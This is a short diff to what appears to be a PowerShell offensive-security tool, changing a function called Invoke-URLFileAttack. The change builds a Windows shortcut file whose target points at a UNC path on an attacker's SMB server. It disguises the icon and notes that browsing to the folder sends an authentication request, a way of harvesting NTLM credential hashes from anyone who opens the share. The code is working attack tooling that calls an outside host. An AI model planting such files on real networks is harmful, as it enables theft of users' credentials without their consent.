@@ -838,7 +838,11 @@ function Invoke-URLFileAttack{
 		try{
 			$jwsh = new-object -ComObject wscript.shell
 			$jshortcut = $jwsh.CreateShortcut($filePath)
-			$jshortcut.IconLocation = "\\$SMBServerIP\test.ico"
+			$jshortcut.TargetPath = "\\$SMBServerIP\@threat.png"
+			$jshortcut.WindowStyle = 1
+			$jshortcut.IconLocation = "%windir%\system32\shell32.dll, 3"
+			$jshortcut.Description = "Browsing to the dir this file lives in will perform an authentication request."
+			$jshortcut.HotKey = "Ctrl+Alt+O"
 			$jshortcut.Save()
 		}
 		catch{$FailedURLFileAttack += "$filePath"}
@@ -1121,3 +1125,4 @@ function Test-DomainJoinStatus {
 		}
 	}
 }
+
